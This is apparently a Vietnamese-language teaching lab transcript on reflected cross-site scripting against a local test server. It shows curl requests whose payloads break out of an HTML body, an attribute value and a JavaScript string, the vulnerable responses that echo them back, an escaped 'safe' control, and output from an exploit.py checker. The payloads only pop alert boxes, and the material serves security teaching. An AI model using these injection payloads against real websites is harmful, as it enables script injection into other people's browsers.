@@ -1,0 +1,71 @@
+# Transcript lab 3.1 - Reflected XSS theo context
+# Chay that, cong 8031, loopback. Ngay: 2026-10-18T10:18:40Z
+
+## 1) curl tho: xem payload phan chieu nguyen van trong tung context
+
+$ curl -s "http://127.0.0.1:8031/html?q=<script>alert(document.domain)</script>"
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>context HTML body</title></head>
+<body>
+<h1>context HTML body</h1>
+<div id=greeting>Ket qua tim kiem cho: <script>alert(document.domain)</script></div>
+</body></html>
+
+$ curl -s "http://127.0.0.1:8031/attr?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>context attribute</title></head>
+<body>
+<h1>context attribute</h1>
+<form><input name=q value=""><img src=x onerror=alert(1)>" placeholder="tu khoa"></form>
+</body></html>
+
+$ curl -s "http://127.0.0.1:8031/js?q=%27%3Balert(String.fromCharCode(88%2C83%2C83))%3B%2F%2F"
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>context JS string</title></head>
+<body>
+<h1>context JS string</h1>
+<div id=out></div><script>
+  var keyword = '';alert(String.fromCharCode(88,83,83));//';
+  document.getElementById('out').textContent = 'Ban tim: ' + keyword;
+</script>
+</body></html>
+
+$ curl -s "http://127.0.0.1:8031/safe?q=<script>alert(1)</script>"  (doi chung)
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>context HTML body (SAFE)</title></head>
+<body>
+<h1>context HTML body (SAFE)</h1>
+<div id=greeting>Ket qua tim kiem cho: &lt;script&gt;alert(1)&lt;/script&gt;</div>
+</body></html>
+
+## 2) exploit.py: kiem tra tu dong tung context
+
+$ python3 exploit.py
+======================================================================
+[CONTEXT] HTML body (/html)
+  URL     : http://127.0.0.1:8031/html?q=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  payload : <script>alert(document.domain)</script>
+  can thay nguyen van: '<script>alert(document.domain)</script>'
+  doan HTML: ...\n<div id=greeting>Ket qua tim kiem cho: <script>alert(document.domain)</script></div>\n</body></html>...
+  KET QUA : PASS - payload vao dung context, chua escape
+======================================================================
+[CONTEXT] attribute value (/attr)
+  URL     : http://127.0.0.1:8031/attr?q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+  payload : "><img src=x onerror=alert(1)>
+  can thay nguyen van: 'value=""><img src=x onerror=alert(1)>'
+  doan HTML: ...text attribute</h1>\n<form><input name=q value=""><img src=x onerror=alert(1)>" placeholder="tu khoa"></form>\n</body><...
+  KET QUA : PASS - payload vao dung context, chua escape
+======================================================================
+[CONTEXT] JS string (/js)
+  URL     : http://127.0.0.1:8031/js?q=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%3B%2F%2F
+  payload : ';alert(String.fromCharCode(88,83,83));//
+  can thay nguyen van: "var keyword = '';alert(String.fromCharCode(88,83,83));//';"
+  doan HTML: ...tring</h1>\n<div id=out></div><script>\n  var keyword = '';alert(String.fromCharCode(88,83,83));//';\n  document.getElementById('out').textCo...
+  KET QUA : PASS - payload vao dung context, chua escape
+======================================================================
+[DOI CHUNG] /safe (escape dung cach)
+  payload nguyen van xuat hien? : KHONG
+  bi encode thanh &lt;script&gt;? : CO (an toan)
+  KET QUA : PASS - escape chan duoc XSS
+======================================================================
+TONG KET: TAT CA PASS
